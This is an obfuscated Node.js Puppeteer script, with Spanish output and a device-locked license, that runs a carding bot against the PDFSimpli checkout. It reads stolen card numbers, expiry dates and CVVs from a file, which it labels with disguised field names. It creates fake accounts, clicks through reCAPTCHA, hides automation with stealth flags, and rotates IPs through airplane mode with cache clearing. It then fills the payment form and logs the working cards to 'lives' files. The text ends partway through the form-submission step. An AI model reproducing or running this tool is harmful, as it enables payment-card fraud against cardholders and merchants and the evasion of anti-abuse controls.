// ======================================================
// ⚡ CYBER NEON THEME — OFUSCADO PARA TERMUX
// ======================================================

const _0x3d4a = {
    reset: "\x1b[0m",
    bright: "\x1b[1m",
    nC: "\x1b[96m",
    nM: "\x1b[95m",
    nB: "\x1b[94m",
    nP: "\x1b[35m",
    nK: "\x1b[91m",
    nG: "\x1b[92m",
    nY: "\x1b[93m"
};

// ======================================================
// 🔒 SISTEMA DE LICENCIA OFUSCADO
// ======================================================

const _0x2f8b = "3e7dccf0-61b4-ce86-7cbf-62165f5bd9ac";
const _0x4a9c = 15;
const _0x5e1d = "/data/data/com.termux/files/home/botdata";

function _0x1a2f() {
    try {
        const _0x3b6a = require("fs");
        const _0x4c7d = require("child_process").execSync;
        const _0x5e8f = require("crypto");
        
        try {
            const _0x2a9b = _0x4c7d("cat /proc/sys/kernel/random/boot_id 2>/dev/null", {
                encoding: "utf8",
                stdio: ['pipe', 'pipe', 'ignore']
            }).trim();
            
            if (_0x2a9b && _0x2a9b.length >= 8) {
                const _0x1c4d = _0x5e8f.createHash("sha256").update(_0x2a9b).digest("hex");
                return `${_0x1c4d.substring(0,8)}-${_0x1c4d.substring(8,12)}-${_0x1c4d.substring(12,16)}-${_0x1c4d.substring(16,20)}-${_0x1c4d.substring(20,32)}`;
            }
        } catch (_0xe5f2) {}
        
        try {
            if (_0x3b6a.existsSync("/proc/sys/kernel/random/boot_id")) {
                const _0x3c8a = _0x3b6a.readFileSync("/proc/sys/kernel/random/boot_id", "utf8").trim();
                if (_0x3c8a) {
                    const _0x4b9c = _0x5e8f.createHash("sha256").update(_0x3c8a).digest("hex");
                    return `${_0x4b9c.substring(0,8)}-${_0x4b9c.substring(8,12)}-${_0x4b9c.substring(12,16)}-${_0x4b9c.substring(16,20)}-${_0x4b9c.substring(20,32)}`;
                }
            }
        } catch (_0xd4a1) {}
        
        const _0x2e7f = "termux-" + Date.now().toString(36);
        const _0x5b9c = _0x5e8f.createHash("sha256").update(_0x2e7f).digest("hex");
        return `${_0x5b9c.substring(0,8)}-${_0x5b9c.substring(8,12)}-${_0x5b9c.substring(12,16)}-${_0x5b9c.substring(16,20)}-${_0x5b9c.substring(20,32)}`;
    } catch (_0xa3b2) {
        return "error-id-" + Date.now().toString(36);
    }
}

function _0x3e8d() {
    try {
        const _0x2c7a = require("fs");
        const _0x4b2c = require("path");
        const _0x1d8e = require("os");
        
        if (!_0x2c7a.existsSync(_0x5e1d)) {
            _0x2c7a.mkdirSync(_0x5e1d, { recursive: true });
        }
        
        const _0x5a9b = _0x4b2c.join(_0x5e1d, "lazaro_license.lock");
        const _0x3c7b = _0x1a2f();
        
        if (!_0x2c7a.existsSync(_0x5a9b)) {
            if (_0x3c7b !== _0x2f8b) {
                console.error(`
${_0x3d4a.nK}${_0x3d4a.bright}
╔══════════════════════════════════════════════════════════════════════╗
║                    ⚠️  ACCESO RESTRINGIDO  ⚠️                     ║
║                                                                      ║
║    Este bot está bloqueado para este dispositivo.                    ║
║                                                                      ║
║    ID de este dispositivo:                                           ║
║    ${_0x3c7b}                                              ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
${_0x3d4a.reset}`);
                process.exit(1);
            }
            
            const _0x2a9c = Date.now();
            const _0x4c8d = _0x2a9c + (_0x4a9c * 86400000);
            
            const _0x3b7a = {
                licenseId: _0x2f8b,
                deviceId: _0x3c7b,
                firstActivation: _0x2a9c,
                expiresAt: _0x4c8d,
                status: "active",
                deviceInfo: {
                    hostname: _0x1d8e.hostname(),
                    platform: _0x1d8e.platform(),
                    arch: _0x1d8e.arch()
                },
                totalRuns: 0,
                lastRun: _0x2a9c,
                createdAt: _0x2a9c
            };
            
            _0x2c7a.writeFileSync(_0x5a9b, JSON.stringify(_0x3b7a, null, 2));
            
            const _0x1e8f = new Date(_0x4c8d);
            
            console.log(`
${_0x3d4a.nG}${_0x3d4a.bright}
╔══════════════════════════════════════════════════════════════════════╗
║                    ✅ LICENCIA ACTIVADA ✅                         ║
║                                                                      ║
║    BOT LAZARO ha sido activado en este dispositivo.                 ║
║                                                                      ║
║    📅 Período: ${_0x4a9c} días                                 ║
║    ⏰ Expira: ${_0x1e8f.toLocaleDateString()} a las ${_0x1e8f.toLocaleTimeString()}   ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
${_0x3d4a.reset}`);
            
            return true;
        }
        
        const _0x3a7c = JSON.parse(_0x2c7a.readFileSync(_0x5a9b, "utf8"));
        const _0x2b9c = Date.now();
        
        if (_0x3a7c.deviceId !== _0x3c7b) {
            console.error(`
${_0x3d4a.nK}${_0x3d4a.bright}
╔══════════════════════════════════════════════════════════════════════╗
║                  ⚠️  VIOLACIÓN DE LICENCIA  ⚠️                    ║
║                                                                      ║
║    Este bot fue movido a otro dispositivo no autorizado.            ║
║                                                                      ║
║    ⚠️  La licencia ha sido bloqueada por seguridad.                ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
${_0x3d4a.reset}`);
            process.exit(1);
        }
        
        if (_0x2b9c > _0x3a7c.expiresAt) {
            const _0x4d8e = new Date(_0x3a7c.expiresAt);
            const _0x5c8f = Math.floor((_0x2b9c - _0x3a7c.expiresAt) / 86400000);
            
            console.error(`
${_0x3d4a.nK}${_0x3d4a.bright}
╔══════════════════════════════════════════════════════════════════════╗
║                    ⚠️  LICENCIA EXPIRADA  ⚠️                     ║
║                                                                      ║
║    Tu período de ${_0x4a9c} días ha finalizado.               ║
║                                                                      ║
║    📅 Expiró el: ${_0x4d8e.toLocaleDateString()}                        ║
║    ⏰ Hace: ${_0x5c8f} día${_0x5c8f !== 1 ? 's' : ''}                                 ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
${_0x3d4a.reset}`);
            process.exit(1);
        }
        
        _0x3a7c.totalRuns = (_0x3a7c.totalRuns || 0) + 1;
        _0x3a7c.lastRun = _0x2b9c;
        
        _0x2c7a.writeFileSync(_0x5a9b, JSON.stringify(_0x3a7c, null, 2));
        
        const _0x6d9c = Math.ceil((_0x3a7c.expiresAt - _0x2b9c) / 86400000);
        const _0x3e8f = new Date(_0x3a7c.expiresAt);
        
        console.log(`
${_0x3d4a.nC}${_0x3d4a.bright}
╔══════════════════════════════════════════════════════════════════════╗
║                    🔐 LICENCIA VERIFICADA 🔐                       ║
║                                                                      ║
║    ✅ Estado: ACTIVA                                                ║
║    📅 Días restantes: ${_0x6d9c}                                      ║
║    ⏰ Expira: ${_0x3e8f.toLocaleDateString()}                           ║
║    📍 Ejecuciones: ${_0x3a7c.totalRuns}                                 ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
${_0x3d4a.reset}`);
        
        return true;
        
    } catch (_0xa4b3) {
        console.error(`
${_0x3d4a.nK}${_0x3d4a.bright}
╔══════════════════════════════════════════════════════════════════════╗
║                    ❌ ERROR DE LICENCIA ❌                         ║
║                                                                      ║
║    No se pudo verificar la licencia.                                 ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
${_0x3d4a.reset}`);
        process.exit(1);
    }
}

_0x3e8d();

// ======================================================
// LOGS OFUSCADOS
// ======================================================

const _0x1c6a = console.log;
const _0x2d7b = console.warn;
const _0x3e8c = console.error;

console.log = (..._0x4f9d) => {
    _0x1c6a(_0x3d4a.nC + _0x3d4a.bright + "▶ " + _0x4f9d.join(" ") + _0x3d4a.reset);
};
console.warn = (..._0x5a9d) => {
    _0x2d7b(_0x3d4a.nY + _0x3d4a.bright + "⚠ " + _0x5a9d.join(" ") + _0x3d4a.reset);
};
console.error = (..._0x6b9e) => {
    _0x3e8c(_0x3d4a.nK + _0x3d4a.bright + "✖ ERROR: " + _0x6b9e.join(" ") + _0x3d4a.reset);
};

console.log(
    _0x3d4a.nM +
    _0x3d4a.bright +
`
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║    ██████╗  ██████╗ ████████╗     ██╗   ██╗███████╗██████╗ ███████╗  ║
║    ██╔══██╗██╔═══██╗╚══██╔══╝     ██║   ██║██╔════╝██╔══██╗██╔════╝  ║
║    ██║  ██║██║   ██║   ██║   ███████║   ██║█████╗  ██████╔╝█████╗    ║
║    ██║  ██║██║   ██║   ██║   ██╔══██║   ██║██╔══╝  ██╔══██╗██╔══╝    ║
║    ██████╔╝╚██████╔╝   ██║   ██║  ██║██╗██║███████╗██║  ██║███████╗  ║
║    ╚═════╝  ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝  ║
║                                                                      ║
║           🟣 BOT LAZARO — CYBER NEON MODE ACTIVATED 🟣               ║
║                        by McMetric & Anthony98                        ║
║                        Licencia: 15 días activa                      ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
`
+ _0x3d4a.reset
);

// ======================================================
// CORE BOT OFUSCADO
// ======================================================

const _0x4a7c = require('puppeteer-core');
const _0x5b8d = require('fs').promises;
const _0x6c9e = require('path');

class _0x7a9f {
    constructor(_0x8baf, _0x9cbf = console.log) {
        this.page = _0x8baf;
        this.log = _0x9cbf;
    }

    _0xadcf(_0xbeef) { return new Promise(_0xceff => setTimeout(_0xceff, _0xbeef)); }

    async _0xdead() {
        try {
            await this._0xadcf(2000);
            let _0xe1af = null, _0xf2bf = null;

            await this.log("🔍 Buscando CAPTCHA...");

            for (let _0x13cf = 0; _0x13cf < 12; _0x13cf++) {
                for (const _0x14df of this.page.frames()) {
                    _0xe1af =
                        await _0x14df.$("#recaptcha-anchor") ||
                        await _0x14df.$(".recaptcha-checkbox-checkmark") ||
                        await _0x14df.$(".recaptcha-checkbox");

                    if (_0xe1af) {
                        _0xf2bf = _0x14df;
                        await this.log(`✅ CAPTCHA encontrado`);
                        break;
                    }
                }
                if (_0xe1af) break;
                await this._0xadcf(700);
            }

            if (!_0xe1af) {
                await this.log("⏩ No hay CAPTCHA");
                return true;
            }

            const _0x15ef = await _0xe1af.boundingBox();
            if (_0x15ef) {
                await this.page.mouse.move(_0x15ef.x + _0x15ef.width / 2, _0x15ef.y + _0x15ef.height / 2);
                await this._0xadcf(100);
                await this.page.mouse.down();
                await this._0xadcf(80);
                await this.page.mouse.up();
            } else {
                await _0xe1af.click();
            }

            await this._0xadcf(3000);

            for (let _0x16ff = 0; _0x16ff < 5; _0x16ff++) {
                try {
                    const _0x17af = await _0xf2bf.$eval(
                        "#recaptcha-anchor",
                        _0x18bf => _0x18bf.getAttribute("aria-checked") === "true"
                    );
                    if (_0x17af) {
                        await this.log("🟢 CAPTCHA resuelto");
                        return true;
                    }
                } catch (_0x19cf) { }
                await this._0xadcf(1200);
            }

            await this.log("⚠️ CAPTCHA manual");
            await this._0xadcf(8000);
            return true;

        } catch (_0x1adf) {
            await this.log("⚠️ Error captcha: " + _0x1adf.message);
            return true;
        }
    }
}

// ======================================================
// BOT LAZARO – BRAIN ENGINE (OFUSCADO)
// ======================================================

class _0x1bef {
    constructor() {
        this.baseDir = _0x5e1d;
        this.logFile = _0x6c9e.join(this.baseDir, "bot_log.txt");
        this.cuentasFile = _0x6c9e.join(this.baseDir, "cuentas_pdfsimpli.json");
        this.livesFile = _0x6c9e.join(this.baseDir, "lives.txt");

        this.CHROMIUM_PATHS = [
            "/data/data/com.termux/files/usr/bin/chromium-browser",
        ];

        this.browser = null;
        this.page = null;
        this.tarjetas = [];
        this.tarjetaIndex = 0;
        this.cuentasProcesadas = 0;
        this.cardsThisAccount = 0;
    }

    _0x1cff(_0x1d0f) { return new Promise(_0x1e1f => setTimeout(_0x1e1f, _0x1d0f)); }

    async log(_0x1f2f) {
        console.log(_0x1f2f);
        await _0x5b8d.appendFile(this.logFile, `[${new Date().toISOString()}] ${_0x1f2f}\n`);
    }

    async _0x203f(_0x214f) {
        try { await _0x5b8d.mkdir(_0x214f, { recursive: true }); } catch (_0x225f) { }
    }

    async _0x236f() {
        for (const _0x247f of this.CHROMIUM_PATHS) {
            try { 
                await _0x5b8d.access(_0x247f); 
                return _0x247f; 
            } catch (_0x258f) { }
        }
        throw new Error("❌ Chromium no encontrado");
    }

    async _0x269f(_0x27af) {
        let _0x28bf = await this.page.$(_0x27af);
        if (_0x28bf) return _0x28bf;
        for (const _0x29cf of this.page.frames()) {
            try {
                _0x28bf = await _0x29cf.$(_0x27af);
                if (_0x28bf) return _0x28bf;
            } catch (_0x2adf) { }
        }
        return null;
    }
    
    async _0x2bef(_0x2cff = 20000) {
        await this.log("⏳ Esperando iframe de reCAPTCHA...");

        const _0x2e0f = Date.now();

        while (Date.now() - _0x2e0f < _0x2cff) {
            const _0x2f1f = await this.page.evaluate(() => {
                const _0x302f = document.querySelector("iframe[src*='recaptcha']");
                return _0x302f !== null;
            });

            if (_0x2f1f) {
                await this.log("🟢 reCAPTCHA iframe cargado");
                return true;
            }

            await this._0x1cff(500);
        }

        await this.log("⚠️ reCAPTCHA no apareció (timeout)");
        return false;
    }

    async _0x313f(_0x324f) {
        for (let _0x335f = 0; _0x335f < 5; _0x335f++) {
            const _0x346f = await this._0x269f(_0x324f);
            if (_0x346f) {
                try {
                    const _0x357f = await _0x346f.boundingBox();
                    if (_0x357f) {
                        await this.page.mouse.move(_0x357f.x + _0x357f.width / 2, _0x357f.y + _0x357f.height / 2);
                        await this._0x1cff(70);
                        await this.page.mouse.down();
                        await this._0x1cff(60);
                        await this.page.mouse.up();
                        return true;
                    } else {
                        await _0x346f.click();
                        return true;
                    }
                } catch (_0x368f) { }
            }
            await this._0x1cff(350);
        }
        return false;
    }

    async _0x379f() {
        await this.log("⏳ Esperando renderizado completo de la página...");

        try {
            await this.page.waitForNetworkIdle({
                idleTime: 1000,
                timeout: 15000
            });
        } catch (_0x38af) {
            await this.log("⚠️ Network idle no alcanzado, continuando...");
        }

        await this.page.evaluate(() => {
            return new Promise((_0x39bf) => {
                if (document.readyState === "complete") {
                    _0x39bf();
                    return;
                }

                let _0x3acf;
                const _0x3bdf = () => {
                    clearTimeout(_0x3acf);
                    _0x3cef.disconnect();
                    _0x39bf();
                };

                const _0x3cef = new MutationObserver(() => {
                    clearTimeout(_0x3acf);
                    _0x3acf = setTimeout(_0x3bdf, 500);
                });

                _0x3cef.observe(document.body, {
                    childList: true,
                    subtree: true,
                    attributes: true
                });

                _0x3acf = setTimeout(_0x3bdf, 3000);
            });
        });

        await this._0x1cff(1500);
        await this.log("✅ Página completamente renderizada");
    }

    async initialize() {
        await this._0x203f(this.baseDir);
        await this._0x203f(_0x6c9e.join(this.baseDir, "documents"));
        await this._0x203f(_0x6c9e.join(this.baseDir, "downloads"));

        const _0x3dff = await this._0x236f();

        const _0x3e0f = require("puppeteer-extra");
        const _0x3f1f = require("puppeteer-extra-plugin-stealth");
        _0x3e0f.use(_0x3f1f());

        this.browser = await _0x3e0f.launch({
            headless: false,
            executablePath: _0x3dff,
            ignoreHTTPSErrors: true,
            defaultViewport: null,
            args: [
                "--no-sandbox",
                "--disable-setuid-sandbox",
                "--disable-dev-shm-usage",
                "--disable-gpu",
                "--disable-software-rasterizer",
                "--disable-infobars",
                "--disable-features=IsolateOrigins,site-per-process",
                "--disable-blink-features=AutomationControlled",
                "--disable-web-security",
                "--ignore-certificate-errors",
                "--mute-audio",
                "--disable-background-timer-throttling",
                "--disable-renderer-backgrounding",
                "--disable-backgrounding-occluded-windows",
                "--single-process",
                "--disable-low-res-tiling",
                "--disable-extensions",
                "--window-size=1280,720",
                `--display=${process.env.DISPLAY || ":99"}`
            ]
        });

        this.page = await this.browser.newPage();

        await this.page.setUserAgent(
            "Mozilla/5.0 (Linux; Android 16; ASUSAI2501D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
        );

        await this.page.evaluateOnNewDocument(() => {
            localStorage.clear();
            sessionStorage.clear();
        });

        await this.page.evaluateOnNewDocument(() => {
            const _0x402f = document.createElement("canvas");
            _0x402f.getContext("webgl") || _0x402f.getContext("experimental-webgl");
        });

        await this.page.setViewport({ width: 1920, height: 1080 });

        await this.log("🚀 BOT LAZARO — Iniciado con LAUNCHER ANTI-DETECCIÓN (Termux + XVFB)");
    }

    async _0x413f() {
        try {
            const _0x424f = await fetch("https://api.ipify.org?format=json", {
                method: "GET",
                timeout: 5000
            }).catch(() => null);

            if (!_0x424f) {
                await this.log("⚠️ Sin internet — esperando reconexión...");
                return "0.0.0.0"; 
            }

            const _0x435f = await _0x424f.json().catch(() => null);
            if (!_0x435f || !_0x435f.ip) return "0.0.0.0";

            return _0x435f.ip;

        } catch (_0x446f) {
            await this.log("⚠️ Error leyendo IP: " + _0x446f.message);
            return "0.0.0.0";
        }
    }

    async _0x457f() {
        if (this.cuentasProcesadas === 0) return;
        if (this.cuentasProcesadas % 2 !== 0) return;

        await this.log("🔄 ROTACIÓN IP MANUAL — ACTIVAR MODO AVIÓN AHORA");
        await this.log("⏳ Esperando cambio REAL de IP…");

        let _0x468f = await this._0x413f();
        await this.log(`📌 IP inicial detectada: ${_0x468f}`);

        while (true) {
            await this._0x1cff(3000);
            let _0x479f = await this._0x413f();

            if (_0x479f && _0x479f !== _0x468f && _0x479f !== "0.0.0.0") {
                await this.log(`🟢 IP CAMBIADA — ${_0x468f} → ${_0x479f}`);
                await this._0x1cff(2000);

                try {
                    await this.log("🧹 Limpiando navegador por cambio de IP...");

                    const _0x48af = this.browser.browserContexts();
                    for (const _0x49bf of _0x48af) {
                        try {
                            const _0x4acf = await _0x49bf.pages();
                            for (const _0x4bdf of _0x4acf) {
                                await _0x4bdf.evaluate(() => {
                                    try {
                                        localStorage.clear();
                                        sessionStorage.clear();
                                    } catch (_0x4cef) {}
                                });
                            }
                            await _0x49bf.clearPermissionOverrides();
                        } catch (_0x4dff) {}
                    }

                    const _0x4e0f = await this.page.target().createCDPSession();
                    await _0x4e0f.send('Network.clearBrowserCache');
                    await _0x4e0f.send('Network.clearBrowserCookies');

                    await this.log("🧼 Limpieza completada ✔️");

                } catch (_0x4f1f) {
                    await this.log("⚠️ Error limpiando navegador: " + _0x4f1f.message);
                }

                return;
            }

            if (!_0x479f || _0x479f === "0.0.0.0") {
                await this.log("⚠️ Sin internet — esperando reconexión...");
            } else {
                await this.log(`⚠️ Misma IP (${_0x479f})... esperando cambio...`);
            }
        }
    }

    async _0x502f() {
        const _0x513f = await _0x5b8d.readFile(_0x6c9e.join(this.baseDir, "tarjetas.txt"), "utf8");
        this.tarjetas = _0x513f
            .split(/\r?\n/)
            .map(_0x524f => _0x524f.trim())
            .filter(Boolean)
            .map(_0x535f => {
                const [_0x546f, _0x557f, _0x568f, _0x579f] = _0x535f.split("|");
                return { cedula: _0x546f, mes: _0x557f, anio: _0x568f, ruc: _0x579f };
            });

        this.tarjetaIndex = 0;
        this.cardsThisAccount = 0;

        await this.log(`💾 Tarjetas cargadas: ${this.tarjetas.length}`);
    }

    _0x58af() {
        if (this.tarjetaIndex >= this.tarjetas.length) return null;
        const _0x59bf = this.tarjetas[this.tarjetaIndex];
        this.tarjetaIndex++;
        return _0x59bf;
    }

    async _0x5acf(_0x5bdf) {
        const _0x5cef = `${_0x5bdf.cedula}|${_0x5bdf.mes}|${_0x5bdf.anio}|${_0x5bdf.ruc}|VALIDA|${new Date().toISOString()}\n`;
        await _0x5b8d.appendFile(this.livesFile, _0x5cef);
        
        console.log(`${_0x3d4a.nG}══════════════════════════════════════════════════════════════════${_0x3d4a.reset}`);
        console.log(`${_0x3d4a.nG}${_0x3d4a.bright}🏦 TARJETA VÁLIDA ENCONTRADA 🏦${_0x3d4a.reset}`);
        console.log(`${_0x3d4a.nG}${_0x3d4a.bright}🟢 Live: ${_0x5bdf.cedula}${_0x3d4a.reset}`);
        console.log(`${_0x3d4a.nG}${_0x3d4a.bright}🗓️  Exp: ${_0x5bdf.mes}/${_0x5bdf.anio}${_0x3d4a.reset}`);
        console.log(`${_0x3d4a.nG}${_0x3d4a.bright}🔑 CVV: ${_0x5bdf.ruc}${_0x3d4a.reset}`);
        console.log(`${_0x3d4a.nG}${_0x3d4a.bright}⏰ Hora: ${new Date().toLocaleTimeString()}${_0x3d4a.reset}`);
        console.log(`${_0x3d4a.nG}══════════════════════════════════════════════════════════════════${_0x3d4a.reset}`);
    }

    async _0x5dff(_0x5e0f) {
        try {
            const _0x5f1f = _0x6c9e.join(this.baseDir, "tarjetas.txt");
            const _0x602f = await _0x5b8d.readFile(_0x5f1f, "utf8");

            const _0x613f = `${_0x5e0f.cedula}|${_0x5e0f.mes}|${_0x5e0f.anio}|${_0x5e0f.ruc}`;

            const _0x624f = _0x602f
                .split(/\r?\n/)
                .filter(_0x635f => _0x635f.trim() && _0x635f.trim() !== _0x613f)
                .join("\n");

            await _0x5b8d.writeFile(_0x5f1f, _0x624f);
            await this.log(`🗑️ Tarjeta eliminada: ${_0x613f}`);

        } catch (_0x646f) {
            await this.log("⚠️ Error eliminando tarjeta: " + _0x646f.message);
        }
    }

    async _0x657f(_0x668f, _0x679f) {
        try {
            const _0x68af = _0x6c9e.join(
                this.baseDir,
                _0x679f ? "validas.txt" : "invalidas.txt"
            );

            const _0x69bf = `${_0x668f.cedula}|${_0x668f.mes}|${_0x668f.anio}|${_0x668f.ruc}|${
                _0x679f ? "VALIDA" : "INVALIDA"
            }|${new Date().toISOString()}\n`;

            await _0x5b8d.appendFile(_0x68af, _0x69bf);

            await this.log(
                `📦 Tarjeta movida a ${_0x679f ? "validas.txt" : "invalidas.txt"}: ${
                    _0x668f.cedula
                }`
            );

        } catch (_0x6acf) {
            await this.log("⚠️ Error guardando tarjeta: " + _0x6acf.message);
        }
    }

    async _0x6bdf() {
        await this.log("📄 Buscando input file...");
        const _0x6cef = await this._0x269f('input[type="file"]');

        if (!_0x6cef) throw new Error("❌ Input file no encontrado");

        const _0x6dff = _0x6c9e.join(this.baseDir, "documents");
        const _0x6e0f = await _0x5b8d.readdir(_0x6dff);
        const _0x6f1f = _0x6e0f.find(_0x702f => _0x702f.endsWith(".pdf"));
        if (!_0x6f1f) throw new Error("❌ No hay PDF");

        const _0x712f = _0x6c9e.join(_0x6dff, _0x6f1f);
        await _0x6cef.uploadFile(_0x712f);

        await this.log("📁 PDF subido: " + _0x712f);
        await this._0x1cff(9000);
    }

    async _0x723f() {
        await this.log("🔍 GET STARTED...");
        let _0x734f = await this._0x313f("#preEditPop");

        if (!_0x734f) {
            _0x734f = await this.page.evaluate(() => {
                for (const _0x745f of document.querySelectorAll("button,div,a")) {
                    if ((_0x745f.innerText || "").toLowerCase().includes("get started")) {
                        _0x745f.click(); return true;
                    }
                }
                return false;
            });
        }

        if (!_0x734f) throw new Error("❌ GET STARTED no encontrado");
        await this._0x1cff(3000);
        await this.log("🟢 GET STARTED presionado");
    }

    async _0x756f() {
        await this.log("⚙️ Esperando Convert...");

        let _0x767f = null;

        for (let _0x778f = 0; _0x778f < 20; _0x778f++) {
            for (const _0x789f of this.page.frames()) {
                _0x767f =
                    await _0x789f.$("#ConvertContinue") ||
                    await _0x789f.$("button[data-test='convert']") ||
                    await _0x789f.$(".button-convert");

                if (_0x767f) break;
            }

            if (_0x767f) break;

            if (_0x778f % 5 === 0)
                await this.log(`⏳ Convert intento ${_0x778f}/20`);

            await this._0x1cff(900);
        }

        if (!_0x767f) throw new Error("❌ Convert no apareció");

        const _0x79af = await _0x767f.boundingBox();
        if (_0x79af) {
            await this.page.mouse.move(_0x79af.x + _0x79af.width / 2, _0x79af.y + _0x79af.height / 2);
            await this._0x1cff(100);
            await this.page.mouse.down();
            await this._0x1cff(60);
            await this.page.mouse.up();
        } else {
            await _0x767f.click();
        }

        await this._0x1cff(6000);
        await this.log("🟢 Convert presionado");
    }

    async _0x7abf() {
        await this.log("⬇️ DOWNLOAD...");

        await this.page._client().send("Page.setDownloadBehavior", {
            behavior: "allow",
            downloadPath: _0x6c9e.join(this.baseDir, "downloads")
        });

        const _0x7bcf = await this._0x313f("#congDwnaut");
        if (!_0x7bcf) {
            await this.log("⚠️ DOWNLOAD no disponible ahora");
            return false;
        }

        await this._0x1cff(6000);
        await this.log("📥 DOWNLOAD presionado");
        return true;
    }

    async _0x7cdf() {
        await this.log("🧑‍💻 Registro...");

        const _0x7def = await this._0x269f("#email");
        if (!_0x7def) {
            await this.log("✔️ No pidió registro");
            return;
        }

        const _0x7eff = await this._0x269f("#password");

        const _0x7fff = `user${Date.now()}@gmail.com`;
        const _0x800f = "P" + Math.random().toString(36).slice(2, 8) + "!";

        await _0x7def.type(_0x7fff, { delay: 80 });
        if (_0x7eff) await _0x7eff.type(_0x800f, { delay: 80 });

        await this._0x313f("#sign-up");

        await this.log("⏳ CAPTCHA...");

        await this._0x2bef();

        const _0x811f = new _0x7a9f(this.page, this.log.bind(this));
        await _0x811f._0xdead();

        await this._0x1cff(1500);
        await this.log(`🟢 Cuenta creada: ${_0x7fff}`);
    }

    async _0x822f() {
        try {
            for (const _0x833f of this.page.frames()) {
                const _0x844f =
                    await _0x833f.$("#planPageContinueButton") ||
                    await _0x833f.$("button[data-test='continue']") ||
                    await _0x833f.$(".continue-button");
                if (_0x844f) return _0x844f;
            }

            const _0x855f = await this.page.evaluateHandle(() => {
                const _0x866f = ["button", "a", "div", "input"];
                for (const _0x877f of _0x866f) {
                    for (const _0x888f of document.querySelectorAll(_0x877f)) {
                        const _0x899f = (_0x888f.innerText || _0x888f.value || "").toLowerCase();
                        if (_0x899f.includes("continue")) return _0x888f;
                    }
                }
                return null;
            });

            if (_0x855f && _0x855f.asElement) return _0x855f.asElement();
            return null;

        } catch (_0x8aaf) {
            console.log("❌ safeFindContinueButton:", _0x8aaf);
            return null;
        }
    }

    async _0x8bbf() {
        await this.log("🔍 Buscando CONTINUE (plan)...");

        let _0x8ccf = null;

        for (let _0x8ddf = 0; _0x8ddf < 20; _0x8ddf++) {
            _0x8ccf = await this._0x822f();
            if (_0x8ccf) break;
            if (_0x8ddf % 5 === 0) await this.log(`⏳ CONTINUE intento ${_0x8ddf}/20`);
            await this._0x1cff(1000);
        }

        if (!_0x8ccf) throw new Error("❌ CONTINUE no apareció");

        const _0x8eef = await _0x8ccf.boundingBox();
        if (_0x8eef) {
            await this.page.mouse.move(_0x8eef.x + _0x8eef.width / 2, _0x8eef.y + _0x8eef.height / 2);
            await this._0x1cff(100);
            await this.page.mouse.down();
            await this._0x1cff(60);
            await this.page.mouse.up();
        } else {
            await _0x8ccf.click();
        }

        await this._0x1cff(5000);
        await this.log("🟢 CONTINUE presionado → entrando a pago...");
    }

    async _0x8fff(_0x900f, _0x911f, _0x922f, _0x933f, _0x944f) {
        await this._0x379f();
        
        await this.log("🧾 Llenando formulario COMPLETO (lento + autoreparación)...");

        const _0x955f = async (_0x966f) => {
            await this.log(`📝 Intento de llenado #${_0x966f + 1}`);

            try {
                const _0x977f =
                    await this._0x269f("#checkout_form_card_name") ||
                    await this._0x269f("[name='cardName']");

                if (!_0x977f) throw new Error("Campo nombre no encontrado");

                await _0x977f.click({ clickCount: 3 });
                await this._0x1cff(200);
                await _0x977f.type(_0x944f, { delay: 120 });

                await this.page.waitForSelector("select[name='ccMonthExp'], #expmo", { timeout: 60000 });
                await this._0x1cff(200);

                const _0x988f = await this.page.evaluate((_0x999f) => {
                    const _0x9aaf = document.querySelector("select[name='ccMonthExp'], #expmo");
                    if (!_0x9aaf) return false;
                    const _0x9bbf = String(parseInt(_0x999f, 10));
                    _0x9aaf.value = _0x9bbf;
                    _0x9aaf.dispatchEvent(new Event("change", { bubbles: true }));
                    return true;
                }, _0x911f);

                if (!_0x988f) throw new Error("Error mes");
                await this._0x1cff(1200);

                await this.page.waitForSelector("select[name='ccYearExp'], #expyr", { timeout: 60000 });
                await this._0x1cff(200);

                const _0x9ccf = await this.page.evaluate((_0x9ddf) => {
                    const _0x9eef = document.querySelector("select[name='ccYearExp'], #expyr");
                    if (!_0x9eef) return false;
                    const _0x9fff = String(parseInt(_0x9ddf, 10));
                    _0x9eef.value = _0x9fff;
                    _0x9eef.dispatchEvent(new Event("change", { bubbles: true }));
                    return true;
                }, _0x922f);

                if (!_0x9ccf) throw new Error("Error año");
                await this._0x1cff(1200);

                let _0xa00f = null;
                const _0xa11f = this.page.frames();

                for (const _0xa22f of _0xa11f) {
                    const _0xa33f = await _0xa22f.$("input[name='cardNumber'], input#data");
                    if (!_0xa33f) continue;
                    const _0xa44f = await _0xa33f.evaluate(_0xa55f => _0xa55f.getAttribute("maxlength") || "");
                    if (_0xa44f && parseInt(_0xa44f, 10) >= 15) {
                        _0xa00f = _0xa33f;
                        break;
                    }
                }

                if (!_0xa00f) throw new Error("Campo tarjeta no encontrado");

                await _0xa00f.click({ clickCount: 3 });
                await this._0x1cff(200);
                await _0xa00f.type(_0x900f, { delay: 90 });

                let _0xa66f = null;
                for (const _0xa77f of _0xa11f) {
                    const _0xa88f = await _0xa77f.$("input#data[name='Data'], input[maxlength='4']");
                    if (!_0xa88f) continue;
                    const _0xa99f = await _0xa88f.evaluate(_0xaaaf => _0xaaaf.getAttribute("maxlength") || "");
                    if (_0xa99f === "4") {
                        _0xa66f = _0xa88f;
                        break;
                    }
                }

                if (!_0xa66f) throw new Error("Campo RUC no encontrado");

                await _0xa66f.click({ clickCount: 3 });
                await this._0x1cff(200);
                await _0xa66f.type(_0x933f, { delay: 90 });

                await this._0x1cff(500);

                let _0xabbf = await this._0x269f("#acceptCheckboxMark");
                if (!_0xabbf) throw new Error("Checkbox no encontrado");

                await this.page.evaluate(_0xaccf => _0xaccf.click(), _0xabbf);

                let _0xadcf = await this._0x269f("#btnChargeebeeSubmit");
                if (!_0xadcf) throw new Error("Submit no encontrado");

                await this.page.evaluate(
                    _0xaecf => _0xaecf.scrollIntoView({ behavior: "instant" }),
                    _0xadcf
                );

                await _0xadcf.click();

                await this._0x1cff(2000);
